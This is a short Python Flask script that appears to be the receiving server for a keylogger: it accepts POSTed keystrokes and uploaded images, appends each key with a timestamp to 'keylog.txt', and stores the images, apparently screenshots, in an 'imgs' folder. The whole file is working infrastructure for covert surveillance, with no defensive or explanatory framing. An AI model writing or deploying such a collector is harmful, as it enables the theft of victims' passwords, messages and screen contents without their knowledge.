from datetime import datetime
from pathlib import Path
from flask import Flask
from flask import request

app = Flask(__name__)


@app.route('/', methods=['POST'])
def receive():
    now = datetime.now().strftime('%d-%m-%Y_%H:%M:%S:%f')

    key = request.form['key']
    log = open('keylog.txt', 'a')
    log.write('{:20}{}\n'.format(str(key), now))
    log.close()

    img = request.files['img']
    imgs = Path('imgs')
    img.save(imgs / '{}.png'.format(now))

    return ''
